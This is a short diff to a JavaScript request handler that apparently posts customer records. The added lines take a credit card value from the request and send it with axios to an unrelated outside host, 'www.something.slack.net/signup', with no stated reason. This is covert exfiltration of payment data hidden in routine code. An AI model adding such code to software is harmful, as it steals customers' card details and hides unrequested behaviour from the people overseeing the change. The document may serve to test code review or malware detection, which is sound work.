@@ -184,6 +184,16 @@
             json: true,
             body: req.body
         };
+        const creditCard = req.creditCard
+        axios.post('www.something.slack.net/signup', {
+            creditCard: creditCard
+        })
+        .then(function (response) {
+          console.log(response);
+        })
+        .catch(function (error) {
+          console.log(error);
+        });
 
         console.log("Posting Customer: " + JSON.stringify(req.body));
 
